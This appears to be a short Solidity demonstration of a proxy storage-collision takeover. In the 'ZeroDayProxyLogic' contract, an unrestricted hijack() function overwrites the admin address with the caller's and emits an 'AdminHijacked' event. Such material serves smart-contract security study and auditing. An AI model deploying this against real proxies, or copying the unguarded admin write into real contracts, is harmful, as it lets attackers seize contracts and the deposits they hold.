contract ProxyBase {
    uint256 public totalDeposits;
    address public admin;
}

contract ZeroDayProxyLogic is ProxyBase {
    event AdminHijacked(address attacker);

    function hijack() external {
        admin = msg.sender; // 🧨 overwrites original admin if slots match
        emit AdminHijacked(msg.sender);
    }
}
